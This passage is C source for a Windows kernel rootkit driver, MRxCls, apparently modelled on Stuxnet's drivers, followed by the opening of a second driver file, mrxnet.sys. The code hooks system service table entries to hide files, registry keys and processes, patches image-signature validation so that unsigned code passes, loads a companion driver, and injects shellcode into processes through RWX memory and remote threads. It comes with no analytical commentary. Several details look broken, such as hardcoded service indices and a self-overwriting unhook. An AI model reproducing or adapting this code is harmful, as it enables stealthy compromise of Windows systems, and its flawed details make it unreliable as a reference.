    PVOID KeyInformation,
    ULONG Length,
    PULONG ResultLength
) {
    NTSTATUS status;
    if (!g_pDeviceExtension || !g_pDeviceExtension->pOriginalNtEnumerateKey) {
        return STATUS_UNSUCCESSFUL;
    }
    status = g_pDeviceExtension->pOriginalNtEnumerateKey(
        KeyHandle,
        Index,
        KeyInformationClass,
        KeyInformation,
        Length,
        ResultLength
    );
    if (!NT_SUCCESS(status) || !KeyInformation) {
        return status;
    }
    if (MRxCls_FilterRegistryKey(KeyInformation, Length, KeyInformationClass, ResultLength) == STATUS_NO_MORE_ENTRIES) {
        return STATUS_NO_MORE_ENTRIES;
    }
    return status;
}

static NTSTATUS NTAPI MRxCls_Hook_NtQueryValueKey(
    HANDLE KeyHandle,
    PUNICODE_STRING ValueName,
    KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    PVOID KeyValueInformation,
    ULONG Length,
    PULONG ResultLength
) {
    NTSTATUS status;
    if (!g_pDeviceExtension || !g_pDeviceExtension->pOriginalNtQueryValueKey) {
        return STATUS_UNSUCCESSFUL;
    }
    if (ValueName && ValueName->Buffer && ValueName->Length > 0) {
        UNICODE_STRING ustrValue;
        ustrValue.Buffer = ValueName->Buffer;
        ustrValue.Length = ValueName->Length;
        ustrValue.MaximumLength = ValueName->MaximumLength;
        if (MRxCls_IsRegistryKeyHidden(&ustrValue)) {
            return STATUS_OBJECT_NAME_NOT_FOUND;
        }
    }
    status = g_pDeviceExtension->pOriginalNtQueryValueKey(
        KeyHandle,
        ValueName,
        KeyValueInformationClass,
        KeyValueInformation,
        Length,
        ResultLength
    );
    return status;
}

static NTSTATUS NTAPI MRxCls_Hook_NtOpenProcess(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
) {
    NTSTATUS status;
    if (!g_pDeviceExtension || !g_pDeviceExtension->pOriginalNtOpenProcess) {
        return STATUS_UNSUCCESSFUL;
    }
    if (ClientId && ClientId->UniqueProcess) {
        HANDLE hProcess = ClientId->UniqueProcess;
        if (hProcess == (HANDLE)0x00000004) {
            return STATUS_ACCESS_DENIED;
        }
    }
    status = g_pDeviceExtension->pOriginalNtOpenProcess(
        ProcessHandle,
        DesiredAccess,
        ObjectAttributes,
        ClientId
    );
    return status;
}

static NTSTATUS NTAPI MRxCls_Hook_NtCreateFile(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength
) {
    NTSTATUS status;
    if (!g_pDeviceExtension || !g_pDeviceExtension->pOriginalNtCreateFile) {
        return STATUS_UNSUCCESSFUL;
    }
    if (ObjectAttributes && ObjectAttributes->ObjectName &&
        ObjectAttributes->ObjectName->Buffer &&
        ObjectAttributes->ObjectName->Length > 0) {
        UNICODE_STRING ustrFile;
        ustrFile.Buffer = ObjectAttributes->ObjectName->Buffer;
        ustrFile.Length = ObjectAttributes->ObjectName->Length;
        ustrFile.MaximumLength = ObjectAttributes->ObjectName->MaximumLength;
        if (MRxCls_IsFileHidden(&ustrFile)) {
            return STATUS_OBJECT_NAME_NOT_FOUND;
        }
    }
    status = g_pDeviceExtension->pOriginalNtCreateFile(
        FileHandle,
        DesiredAccess,
        ObjectAttributes,
        IoStatusBlock,
        AllocationSize,
        FileAttributes,
        ShareAccess,
        CreateDisposition,
        CreateOptions,
        EaBuffer,
        EaLength
    );
    return status;
}

static NTSTATUS NTAPI MRxCls_Hook_SeValidateImageHeader(
    PVOID ImageBase,
    ULONG ImageSize,
    BOOLEAN KernelMode
) {
    NTSTATUS status;
    PIMAGE_DOS_HEADER pDos;
    PIMAGE_NT_HEADERS pNt;
    if (!g_pDeviceExtension || !g_pDeviceExtension->pOriginalSeValidateImageHeader) {
        return STATUS_UNSUCCESSFUL;
    }
    status = g_pDeviceExtension->pOriginalSeValidateImageHeader(ImageBase, ImageSize, KernelMode);
    if (!NT_SUCCESS(status)) {
        pDos = (PIMAGE_DOS_HEADER)ImageBase;
        if (pDos->e_magic == IMAGE_DOS_SIGNATURE) {
            pNt = (PIMAGE_NT_HEADERS)((PBYTE)ImageBase + pDos->e_lfanew);
            if (pNt->Signature == IMAGE_NT_SIGNATURE) {
                status = STATUS_SUCCESS;
            }
        }
    }
    return status;
}

static VOID MRxCls_InitSSDTIndices(VOID) {
    if (!g_pDeviceExtension) return;
    g_pDeviceExtension->ulSSDTIndex_NtQueryDirectoryFile = 0x10C;
    g_pDeviceExtension->ulSSDTIndex_NtQuerySystemInformation = 0x10D;
    g_pDeviceExtension->ulSSDTIndex_NtEnumerateKey = 0x10E;
    g_pDeviceExtension->ulSSDTIndex_NtQueryValueKey = 0x10F;
    g_pDeviceExtension->ulSSDTIndex_NtOpenProcess = 0x110;
    g_pDeviceExtension->ulSSDTIndex_NtCreateFile = 0x111;
}

static NTSTATUS MRxCls_GetSSDT(VOID) {
    UNICODE_STRING ustrName;
    if (!g_pDeviceExtension) return STATUS_UNSUCCESSFUL;
    RtlInitUnicodeString(&ustrName, L"KeServiceDescriptorTable");
    g_pDeviceExtension->pServiceDescriptorTable = (PSERVICE_DESCRIPTOR_TABLE)MmGetSystemRoutineAddress(&ustrName);
    if (!g_pDeviceExtension->pServiceDescriptorTable) {
        return STATUS_UNSUCCESSFUL;
    }
    return STATUS_SUCCESS;
}

static NTSTATUS MRxCls_GetNtImports(VOID) {
    UNICODE_STRING ustrName;
    if (!g_pDeviceExtension) return STATUS_UNSUCCESSFUL;
    RtlInitUnicodeString(&ustrName, L"ZwProtectVirtualMemory");
    g_pDeviceExtension->pZwProtectVirtualMemory = (PFN_ZwProtectVirtualMemory)MmGetSystemRoutineAddress(&ustrName);
    RtlInitUnicodeString(&ustrName, L"ZwAllocateVirtualMemory");
    g_pDeviceExtension->pZwAllocateVirtualMemory = (PFN_ZwAllocateVirtualMemory)MmGetSystemRoutineAddress(&ustrName);
    RtlInitUnicodeString(&ustrName, L"ZwFreeVirtualMemory");
    g_pDeviceExtension->pZwFreeVirtualMemory = (PFN_ZwFreeVirtualMemory)MmGetSystemRoutineAddress(&ustrName);
    RtlInitUnicodeString(&ustrName, L"ZwWriteVirtualMemory");
    g_pDeviceExtension->pZwWriteVirtualMemory = (PFN_ZwWriteVirtualMemory)MmGetSystemRoutineAddress(&ustrName);
    RtlInitUnicodeString(&ustrName, L"ZwReadVirtualMemory");
    g_pDeviceExtension->pZwReadVirtualMemory = (PFN_ZwReadVirtualMemory)MmGetSystemRoutineAddress(&ustrName);
    RtlInitUnicodeString(&ustrName, L"ZwQueryInformationProcess");
    g_pDeviceExtension->pZwQueryInformationProcess = (PFN_ZwQueryInformationProcess)MmGetSystemRoutineAddress(&ustrName);
    RtlInitUnicodeString(&ustrName, L"ZwCreateThreadEx");
    g_pDeviceExtension->pZwCreateThreadEx = (PFN_ZwCreateThreadEx)MmGetSystemRoutineAddress(&ustrName);
    RtlInitUnicodeString(&ustrName, L"ZwResumeThread");
    g_pDeviceExtension->pZwResumeThread = (PFN_ZwResumeThread)MmGetSystemRoutineAddress(&ustrName);
    if (!g_pDeviceExtension->pZwProtectVirtualMemory ||
        !g_pDeviceExtension->pZwAllocateVirtualMemory ||
        !g_pDeviceExtension->pZwFreeVirtualMemory ||
        !g_pDeviceExtension->pZwWriteVirtualMemory ||
        !g_pDeviceExtension->pZwReadVirtualMemory ||
        !g_pDeviceExtension->pZwQueryInformationProcess) {
        return STATUS_UNSUCCESSFUL;
    }
    return STATUS_SUCCESS;
}

static NTSTATUS MRxCls_InstallHooks(VOID) {
    NTSTATUS status;
    PVOID pFunc;
    KIRQL oldIrql;
    if (!g_pDeviceExtension) return STATUS_UNSUCCESSFUL;
    if (g_pDeviceExtension->bHooksInstalled) {
        return STATUS_SUCCESS;
    }
    status = MRxCls_GetSSDT();
    if (!NT_SUCCESS(status)) {
        return status;
    }
    MRxCls_InitSSDTIndices();
    pFunc = MmGetSystemRoutineAddress(&(UNICODE_STRING){.Buffer = L"NtQueryDirectoryFile", .Length = 40, .MaximumLength = 40});
    if (pFunc) {
        g_pDeviceExtension->pOriginalNtQueryDirectoryFile = (PFN_NtQueryDirectoryFile)pFunc;
    }
    pFunc = MmGetSystemRoutineAddress(&(UNICODE_STRING){.Buffer = L"NtQuerySystemInformation", .Length = 46, .MaximumLength = 46});
    if (pFunc) {
        g_pDeviceExtension->pOriginalNtQuerySystemInformation = (PFN_NtQuerySystemInformation)pFunc;
    }
    pFunc = MmGetSystemRoutineAddress(&(UNICODE_STRING){.Buffer = L"NtEnumerateKey", .Length = 28, .MaximumLength = 28});
    if (pFunc) {
        g_pDeviceExtension->pOriginalNtEnumerateKey = (PFN_NtEnumerateKey)pFunc;
    }
    pFunc = MmGetSystemRoutineAddress(&(UNICODE_STRING){.Buffer = L"NtQueryValueKey", .Length = 30, .MaximumLength = 30});
    if (pFunc) {
        g_pDeviceExtension->pOriginalNtQueryValueKey = (PFN_NtQueryValueKey)pFunc;
    }
    pFunc = MmGetSystemRoutineAddress(&(UNICODE_STRING){.Buffer = L"NtOpenProcess", .Length = 26, .MaximumLength = 26});
    if (pFunc) {
        g_pDeviceExtension->pOriginalNtOpenProcess = (PFN_NtOpenProcess)pFunc;
    }
    pFunc = MmGetSystemRoutineAddress(&(UNICODE_STRING){.Buffer = L"NtCreateFile", .Length = 26, .MaximumLength = 26});
    if (pFunc) {
        g_pDeviceExtension->pOriginalNtCreateFile = (PFN_NtCreateFile)pFunc;
    }
    pFunc = MmGetSystemRoutineAddress(&(UNICODE_STRING){.Buffer = L"SeValidateImageHeader", .Length = 40, .MaximumLength = 40});
    if (pFunc) {
        g_pDeviceExtension->pOriginalSeValidateImageHeader = (PFN_SeValidateImageHeader)pFunc;
    }
    if (!g_pDeviceExtension->pOriginalNtQueryDirectoryFile ||
        !g_pDeviceExtension->pOriginalNtQuerySystemInformation ||
        !g_pDeviceExtension->pOriginalNtEnumerateKey ||
        !g_pDeviceExtension->pOriginalNtQueryValueKey ||
        !g_pDeviceExtension->pOriginalNtOpenProcess ||
        !g_pDeviceExtension->pOriginalNtCreateFile) {
        return STATUS_UNSUCCESSFUL;
    }
    status = MRxCls_GetNtImports();
    if (!NT_SUCCESS(status)) {
        return status;
    }
    oldIrql = KeRaiseIrqlToDpcLevel();
    g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtQueryDirectoryFile] = (PVOID)MRxCls_Hook_NtQueryDirectoryFile;
    g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtQuerySystemInformation] = (PVOID)MRxCls_Hook_NtQuerySystemInformation;
    g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtEnumerateKey] = (PVOID)MRxCls_Hook_NtEnumerateKey;
    g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtQueryValueKey] = (PVOID)MRxCls_Hook_NtQueryValueKey;
    g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtOpenProcess] = (PVOID)MRxCls_Hook_NtOpenProcess;
    g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtCreateFile] = (PVOID)MRxCls_Hook_NtCreateFile;
    KeLowerIrql(oldIrql);
    if (g_pDeviceExtension->pOriginalSeValidateImageHeader) {
        oldIrql = KeRaiseIrqlToDpcLevel();
        *(PVOID*)g_pDeviceExtension->pOriginalSeValidateImageHeader = (PVOID)MRxCls_Hook_SeValidateImageHeader;
        KeLowerIrql(oldIrql);
    }
    g_pDeviceExtension->bHooksInstalled = TRUE;
    g_pDeviceExtension->ulInfoCount++;
    return STATUS_SUCCESS;
}

static VOID MRxCls_UninstallHooks(VOID) {
    KIRQL oldIrql;
    if (!g_pDeviceExtension || !g_pDeviceExtension->bHooksInstalled || !g_pDeviceExtension->pServiceDescriptorTable) {
        return;
    }
    oldIrql = KeRaiseIrqlToDpcLevel();
    if (g_pDeviceExtension->pOriginalNtQueryDirectoryFile) {
        g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtQueryDirectoryFile] = (PVOID)g_pDeviceExtension->pOriginalNtQueryDirectoryFile;
    }
    if (g_pDeviceExtension->pOriginalNtQuerySystemInformation) {
        g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtQuerySystemInformation] = (PVOID)g_pDeviceExtension->pOriginalNtQuerySystemInformation;
    }
    if (g_pDeviceExtension->pOriginalNtEnumerateKey) {
        g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtEnumerateKey] = (PVOID)g_pDeviceExtension->pOriginalNtEnumerateKey;
    }
    if (g_pDeviceExtension->pOriginalNtQueryValueKey) {
        g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtQueryValueKey] = (PVOID)g_pDeviceExtension->pOriginalNtQueryValueKey;
    }
    if (g_pDeviceExtension->pOriginalNtOpenProcess) {
        g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtOpenProcess] = (PVOID)g_pDeviceExtension->pOriginalNtOpenProcess;
    }
    if (g_pDeviceExtension->pOriginalNtCreateFile) {
        g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtCreateFile] = (PVOID)g_pDeviceExtension->pOriginalNtCreateFile;
    }
    if (g_pDeviceExtension->pOriginalSeValidateImageHeader) {
        *(PVOID*)g_pDeviceExtension->pOriginalSeValidateImageHeader = (PVOID)g_pDeviceExtension->pOriginalSeValidateImageHeader;
    }
    KeLowerIrql(oldIrql);
    g_pDeviceExtension->bHooksInstalled = FALSE;
    g_pDeviceExtension->ulInfoCount++;
}

static NTSTATUS MRxCls_LoadMrxNet(VOID) {
    NTSTATUS status;
    UNICODE_STRING ustrDriverPath;
    HANDLE hFile;
    OBJECT_ATTRIBUTES objAttr;
    IO_STATUS_BLOCK ioStatus;
    if (!g_pDeviceExtension) return STATUS_UNSUCCESSFUL;
    if (g_pDeviceExtension->bDriver2Loaded) {
        return STATUS_SUCCESS;
    }
    RtlInitUnicodeString(&ustrDriverPath, L"\\SystemRoot\\system32\\drivers\\mrxnet.sys");
    InitializeObjectAttributes(&objAttr, &ustrDriverPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    status = ZwCreateFile(&hFile, GENERIC_READ, &objAttr, &ioStatus, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, 0, NULL, 0);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    ZwClose(hFile);
    RtlInitUnicodeString(&ustrDriverPath, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\MRxNet");
    status = ZwLoadDriver(&ustrDriverPath);
    if (NT_SUCCESS(status)) {
        g_pDeviceExtension->bDriver2Loaded = TRUE;
        g_pDeviceExtension->ulInfoCount++;
    }
    return status;
}

static NTSTATUS MRxCls_InjectIntoProcess(HANDLE ProcessId, PVOID pBuffer, SIZE_T BufferSize) {
    NTSTATUS status;
    HANDLE hProcess;
    PEPROCESS pProcess;
    PVOID pAllocAddress;
    SIZE_T RegionSize;
    ULONG OldProtect;
    PINJECTION_ENTRY pEntry;
    ULONG i;
    if (!g_pDeviceExtension || !ProcessId || !pBuffer || BufferSize == 0) {
        return STATUS_INVALID_PARAMETER;
    }
    status = PsLookupProcessByProcessId(ProcessId, &pProcess);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    status = ObOpenObjectByPointer(pProcess, OBJ_KERNEL_HANDLE, NULL, PROCESS_ALL_ACCESS, *PsProcessType, KernelMode, &hProcess);
    ObDereferenceObject(pProcess);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    pAllocAddress = NULL;
    RegionSize = BufferSize;
    status = g_pDeviceExtension->pZwAllocateVirtualMemory(
        hProcess,
        &pAllocAddress,
        0,
        &RegionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!NT_SUCCESS(status)) {
        ZwClose(hProcess);
        return status;
    }
    status = g_pDeviceExtension->pZwWriteVirtualMemory(
        hProcess,
        pAllocAddress,
        pBuffer,
        BufferSize,
        NULL
    );
    if (!NT_SUCCESS(status)) {
        g_pDeviceExtension->pZwFreeVirtualMemory(hProcess, &pAllocAddress, &RegionSize, MEM_RELEASE);
        ZwClose(hProcess);
        return status;
    }
    status = g_pDeviceExtension->pZwProtectVirtualMemory(
        hProcess,
        &pAllocAddress,
        &RegionSize,
        PAGE_EXECUTE_READWRITE,
        &OldProtect
    );
    if (!NT_SUCCESS(status)) {
        g_pDeviceExtension->pZwFreeVirtualMemory(hProcess, &pAllocAddress, &RegionSize, MEM_RELEASE);
        ZwClose(hProcess);
        return status;
    }
    for (i = 0; i < MRXCLS_MAX_INJECTION_ENTRIES; i++) {
        if (!g_pDeviceExtension->InjectionEntries[i].Active) {
            pEntry = &g_pDeviceExtension->InjectionEntries[i];
            pEntry->ProcessId = ProcessId;
            pEntry->BaseAddress = pAllocAddress;
            pEntry->RegionSize = RegionSize;
            pEntry->Protect = PAGE_EXECUTE_READWRITE;
            pEntry->Active = TRUE;
            g_pDeviceExtension->ulInjectionCount++;
            break;
        }
    }
    ZwClose(hProcess);
    g_pDeviceExtension->ulProcessInjectionCount++;
    return STATUS_SUCCESS;
}

static NTSTATUS MRxCls_InjectShellcode(HANDLE ProcessId, PVOID pShellcode, SIZE_T ShellcodeSize) {
    NTSTATUS status;
    HANDLE hProcess;
    PEPROCESS pProcess;
    PVOID pAllocAddress;
    SIZE_T RegionSize;
    ULONG OldProtect;
    HANDLE hThread;
    if (!g_pDeviceExtension || !ProcessId || !pShellcode || ShellcodeSize == 0) {
        return STATUS_INVALID_PARAMETER;
    }
    status = PsLookupProcessByProcessId(ProcessId, &pProcess);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    status = ObOpenObjectByPointer(pProcess, OBJ_KERNEL_HANDLE, NULL, PROCESS_ALL_ACCESS, *PsProcessType, KernelMode, &hProcess);
    ObDereferenceObject(pProcess);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    pAllocAddress = NULL;
    RegionSize = ShellcodeSize;
    status = g_pDeviceExtension->pZwAllocateVirtualMemory(
        hProcess,
        &pAllocAddress,
        0,
        &RegionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!NT_SUCCESS(status)) {
        ZwClose(hProcess);
        return status;
    }
    status = g_pDeviceExtension->pZwWriteVirtualMemory(
        hProcess,
        pAllocAddress,
        pShellcode,
        ShellcodeSize,
        NULL
    );
    if (!NT_SUCCESS(status)) {
        g_pDeviceExtension->pZwFreeVirtualMemory(hProcess, &pAllocAddress, &RegionSize, MEM_RELEASE);
        ZwClose(hProcess);
        return status;
    }
    status = g_pDeviceExtension->pZwProtectVirtualMemory(
        hProcess,
        &pAllocAddress,
        &RegionSize,
        PAGE_EXECUTE_READWRITE,
        &OldProtect
    );
    if (!NT_SUCCESS(status)) {
        g_pDeviceExtension->pZwFreeVirtualMemory(hProcess, &pAllocAddress, &RegionSize, MEM_RELEASE);
        ZwClose(hProcess);
        return status;
    }
    status = g_pDeviceExtension->pZwCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        pAllocAddress,
        NULL,
        0,
        0,
        0,
        0,
        NULL
    );
    if (NT_SUCCESS(status)) {
        ZwClose(hThread);
        g_pDeviceExtension->ulProcessInjectionCount++;
    }
    ZwClose(hProcess);
    return status;
}

static NTSTATUS MRxCls_DeviceControl(
    PDEVICE_OBJECT pDeviceObject,
    PIRP pIrp
) {
    PIO_STACK_LOCATION pStack;
    NTSTATUS status;
    ULONG ulIoControlCode;
    PVOID pInputBuffer;
    PVOID pOutputBuffer;
    ULONG ulInputBufferLength;
    ULONG ulOutputBufferLength;
    if (!pDeviceObject || !pIrp) {
        return STATUS_INVALID_PARAMETER;
    }
    pStack = IoGetCurrentIrpStackLocation(pIrp);
    ulIoControlCode = pStack->Parameters.DeviceIoControl.IoControlCode;
    pInputBuffer = pIrp->AssociatedIrp.SystemBuffer;
    pOutputBuffer = pIrp->AssociatedIrp.SystemBuffer;
    ulInputBufferLength = pStack->Parameters.DeviceIoControl.InputBufferLength;
    ulOutputBufferLength = pStack->Parameters.DeviceIoControl.OutputBufferLength;
    status = STATUS_SUCCESS;
    if (!g_pDeviceExtension) {
        status = STATUS_UNSUCCESSFUL;
        goto CompleteRequest;
    }
    g_pDeviceExtension->ulIoControlCount++;
    switch (ulIoControlCode) {
        case MRXCLS_IOCTL_INSTALL_HOOKS:
            status = MRxCls_InstallHooks();
            break;
        case MRXCLS_IOCTL_UNINSTALL_HOOKS:
            MRxCls_UninstallHooks();
            status = STATUS_SUCCESS;
            break;
        case MRXCLS_IOCTL_LOAD_MRXNET:
            status = MRxCls_LoadMrxNet();
            break;
        case MRXCLS_IOCTL_HIDE_PROCESS:
            if (pInputBuffer && ulInputBufferLength >= sizeof(HANDLE)) {
                HANDLE ProcessId = *(PHANDLE)pInputBuffer;
                status = MRxCls_InjectIntoProcess(ProcessId, NULL, 0);
            } else {
                status = STATUS_INVALID_PARAMETER;
            }
            break;
        case MRXCLS_IOCTL_UNHIDE_PROCESS:
            status = STATUS_SUCCESS;
            break;
        case MRXCLS_IOCTL_GET_STATUS:
            if (pOutputBuffer && ulOutputBufferLength >= sizeof(ULONG)) {
                *(PULONG)pOutputBuffer = g_pDeviceExtension->bHooksInstalled ? 1 : 0;
                status = STATUS_SUCCESS;
            } else {
                status = STATUS_BUFFER_TOO_SMALL;
            }
            break;
        default:
            status = STATUS_INVALID_PARAMETER;
            break;
    }
CompleteRequest:
    pIrp->IoStatus.Status = status;
    pIrp->IoStatus.Information = 0;
    IoCompleteRequest(pIrp, IO_NO_INCREMENT);
    return status;
}

static NTSTATUS MRxCls_DispatchCreate(
    PDEVICE_OBJECT pDeviceObject,
    PIRP pIrp
) {
    if (!pIrp) return STATUS_INVALID_PARAMETER;
    pIrp->IoStatus.Status = STATUS_SUCCESS;
    pIrp->IoStatus.Information = 0;
    IoCompleteRequest(pIrp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

static NTSTATUS MRxCls_DispatchClose(
    PDEVICE_OBJECT pDeviceObject,
    PIRP pIrp
) {
    if (!pIrp) return STATUS_INVALID_PARAMETER;
    pIrp->IoStatus.Status = STATUS_SUCCESS;
    pIrp->IoStatus.Information = 0;
    IoCompleteRequest(pIrp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

static NTSTATUS MRxCls_DispatchReadWrite(
    PDEVICE_OBJECT pDeviceObject,
    PIRP pIrp
) {
    if (!pIrp) return STATUS_INVALID_PARAMETER;
    pIrp->IoStatus.Status = STATUS_SUCCESS;
    pIrp->IoStatus.Information = 0;
    IoCompleteRequest(pIrp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

static NTSTATUS MRxCls_CreateDevice(
    PDRIVER_OBJECT pDriverObject,
    PMRXCLS_DEVICE_EXTENSION pDeviceExtension
) {
    NTSTATUS status;
    UNICODE_STRING ustrDeviceName;
    UNICODE_STRING ustrSymbolicName;
    PDEVICE_OBJECT pDeviceObject;
    if (!pDriverObject || !pDeviceExtension) {
        return STATUS_INVALID_PARAMETER;
    }
    RtlInitUnicodeString(&ustrDeviceName, MRXCLS_DEVICE_NAME);
    RtlInitUnicodeString(&ustrSymbolicName, MRXCLS_SYMLINK_NAME);
    status = IoCreateDevice(
        pDriverObject,
        sizeof(MRXCLS_DEVICE_EXTENSION),
        &ustrDeviceName,
        FILE_DEVICE_UNKNOWN,
        0,
        FALSE,
        &pDeviceObject
    );
    if (!NT_SUCCESS(status)) {
        return status;
    }
    pDeviceObject->Flags |= DO_BUFFERED_IO;
    pDeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;
    status = IoCreateSymbolicLink(&ustrSymbolicName, &ustrDeviceName);
    if (!NT_SUCCESS(status)) {
        IoDeleteDevice(pDeviceObject);
        return status;
    }
    pDeviceExtension->pDeviceObject = pDeviceObject;
    pDeviceExtension->bInitialized = TRUE;
    return STATUS_SUCCESS;
}

static VOID MRxCls_DeleteDevice(
    PDRIVER_OBJECT pDriverObject
) {
    UNICODE_STRING ustrSymbolicName;
    if (!pDriverObject) return;
    RtlInitUnicodeString(&ustrSymbolicName, MRXCLS_SYMLINK_NAME);
    IoDeleteSymbolicLink(&ustrSymbolicName);
    if (pDriverObject->DeviceObject) {
        IoDeleteDevice(pDriverObject->DeviceObject);
    }
}

static VOID MRxCls_Unload(
    PDRIVER_OBJECT pDriverObject
) {
    UNICODE_STRING ustrDriverPath;
    if (!pDriverObject) return;
    if (g_pDeviceExtension) {
        MRxCls_UninstallHooks();
        if (g_pDeviceExtension->bDriver2Loaded) {
            RtlInitUnicodeString(&ustrDriverPath, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\MRxNet");
            ZwUnloadDriver(&ustrDriverPath);
            g_pDeviceExtension->bDriver2Loaded = FALSE;
        }
        KeSetEvent(&g_pDeviceExtension->UnloadEvent, IO_NO_INCREMENT, FALSE);
    }
    MRxCls_DeleteDevice(pDriverObject);
    g_pDeviceExtension = NULL;
    g_pDriverObject = NULL;
}

static NTSTATUS MRxCls_DriverEntry(
    PDRIVER_OBJECT pDriverObject,
    PUNICODE_STRING pRegistryPath
) {
    NTSTATUS status;
    ULONG i;
    if (!pDriverObject || !pRegistryPath) {
        return STATUS_INVALID_PARAMETER;
    }
    g_pDriverObject = pDriverObject;
    g_pDeviceExtension = (PMRXCLS_DEVICE_EXTENSION)ExAllocatePoolWithTag(
        NonPagedPool,
        sizeof(MRXCLS_DEVICE_EXTENSION),
        MRXCLS_POOL_TAG
    );
    if (!g_pDeviceExtension) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    RtlZeroMemory(g_pDeviceExtension, sizeof(MRXCLS_DEVICE_EXTENSION));
    status = MRxCls_CreateDevice(pDriverObject, g_pDeviceExtension);
    if (!NT_SUCCESS(status)) {
        ExFreePoolWithTag(g_pDeviceExtension, MRXCLS_POOL_TAG);
        g_pDeviceExtension = NULL;
        return status;
    }
    KeInitializeSpinLock(&g_pDeviceExtension->SpinLock);
    KeInitializeEvent(&g_pDeviceExtension->LoadEvent, NotificationEvent, FALSE);
    KeInitializeEvent(&g_pDeviceExtension->UnloadEvent, NotificationEvent, FALSE);
    MRxCls_InitHiddenLists();
    for (i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++) {
        pDriverObject->MajorFunction[i] = MRxCls_DispatchReadWrite;
    }
    pDriverObject->MajorFunction[IRP_MJ_CREATE] = MRxCls_DispatchCreate;
    pDriverObject->MajorFunction[IRP_MJ_CLOSE] = MRxCls_DispatchClose;
    pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = MRxCls_DeviceControl;
    pDriverObject->DriverUnload = MRxCls_Unload;
    status = MRxCls_InstallHooks();
    if (!NT_SUCCESS(status)) {
        MRxCls_Unload(pDriverObject);
        return status;
    }
    status = MRxCls_LoadMrxNet();
    if (!NT_SUCCESS(status)) {
        MRxCls_Unload(pDriverObject);
        return status;
    }
    g_pDeviceExtension->ulInfoCount++;
    KeSetEvent(&g_pDeviceExtension->LoadEvent, IO_NO_INCREMENT, FALSE);
    return STATUS_SUCCESS;
}

NTSTATUS DriverEntry(
    PDRIVER_OBJECT pDriverObject,
    PUNICODE_STRING pRegistryPath
) {
    return MRxCls_DriverEntry(pDriverObject, pRegistryPath);
}
END

mrxnet.sys:
#define _WIN32_WINNT 0x0501
#define WINVER 0x0501

#include <ntddk.h>
#include <ntifs.h>
#include <ntimage.h>
#include <ntstatus.h>
#include <ntdddisk.h>

#pragma comment(lib, "ntoskrnl.lib")
#pragma comment(lib, "hal.lib")

#define STATUS_SUCCESS              ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL         ((NTSTATUS)0xC0000001L)
#define STATUS_ACCESS_DENIED        ((NTSTATUS)0xC0000022L)
#define STATUS_INVALID_PARAMETER    ((NTSTATUS)0xC000000DL)
#define STATUS_NO_MORE_ENTRIES      ((NTSTATUS)0x8000001AL)
#define STATUS_OBJECT_NAME_NOT_FOUND ((NTSTATUS)0xC0000034L)
#define STATUS_INSUFFICIENT_RESOURCES ((NTSTATUS)0xC000009AL)
#define STATUS_BUFFER_TOO_SMALL     ((NTSTATUS)0xC0000023L)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#define STATUS_NOT_SUPPORTED        ((NTSTATUS)0xC00000BBL)

#define OBJ_CASE_INSENSITIVE        0x00000040L
#define OBJ_KERNEL_HANDLE           0x00000200L
#define FILE_SHARE_READ             0x00000001
#define FILE_SHARE_WRITE            0x00000002
#define FILE_OPEN_IF                0x00000003
#define FILE_DIRECTORY_FILE         0x00000001
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
#define KernelMode                  0
